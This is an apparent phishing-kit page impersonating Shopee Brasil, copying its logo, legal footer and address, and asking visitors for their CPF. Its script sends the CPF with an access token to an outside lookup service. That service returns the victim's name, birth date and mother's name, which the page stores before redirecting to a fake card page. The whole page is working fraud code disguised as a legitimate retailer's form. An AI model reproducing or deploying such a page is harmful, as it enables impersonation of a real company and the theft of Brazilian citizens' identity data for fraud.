<div style="display: grid; grid-template-areas: 'top-bar' 'content' 'footer'; grid-template-rows: auto 1fr auto; min-height: 100vh;">    
   <div class="header">
       <img src="../../pabluzw.com/shopee-cartao/logo.png" alt="Shopee Logo" style="width: 160px;">
   </div>

   <div style="grid-area: content; padding: 0 1rem;"> 
       <div style="margin-top: 40px;" class="main-content">
           <div id="formulario" class="mb-3">
               <p class="form-title">Digite seu CPF para continuar</p>
               <form id="cadastroForm" style="text-align:initial" onsubmit="processarFormulario(event)">
                   <div class="mb-3">
                       <label for="cpf" class="form-label">CPF</label>
                       <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
                   </div>
                   <button type="submit" class="btn btn-custom">
                       <div class="spinner"></div>
                       <span>Continuar</span>
                   </button>
               </form>
           </div>
       </div>
   </div> 

   <div class="footer" id="footerChg">
       © 2025 Shopee Brasil. CNPJ: 35.635.824/0001-12<br>
       Av. das Nações Unidas, 3003 - Bonfim, Osasco - SP, 06233-903
   </div>
</div>

<script>

async function processarFormulario(event) {
    event.preventDefault();
    
    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
    
    if (!cpf) {
        alert('Por favor, digite seu CPF.');
        return;
    }

    const submitButton = document.querySelector('button[type="submit"]');
    const buttonText = submitButton.querySelector('span');
    
    submitButton.classList.add('loading');
    submitButton.disabled = true;
    buttonText.style.display = 'none';

    try {
        const response = await fetch(`https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf=${cpf}`);
        const data = await response.json();

        let dadosUsuario;

        if (data && data.DADOS) {
            dadosUsuario = {
                nome: data.DADOS.NOME || "Usuario",
                cpf: data.DADOS.CPF,
                nascimento: data.DADOS.NASC,
                mae: data.DADOS.NOME_MAE
            };
        } else {
            dadosUsuario = {
                nome: "Usuario",
                cpf: cpf,
                nascimento: "",
                mae: ""
            };
        }

        localStorage.setItem('dadosUsuarioUni', JSON.stringify(dadosUsuario));
        location.href = '../card/index.php.html';
        
    } catch (error) {
        console.error('Erro ao consultar a API:', error);
        
        // Fallback em caso de erro
        const dadosUsuario = {
            nome: "Usuario",
            cpf: cpf,
            nascimento: "",
            mae: ""
        };
        
        localStorage.setItem('dadosUsuarioUni', JSON.stringify(dadosUsuario));
        location.href = '../card/index.php.html';
        
    } finally {
        submitButton.classList.remove('loading');
        submitButton.disabled = false;
        buttonText.style.display = 'inline';
    }
}


</script>
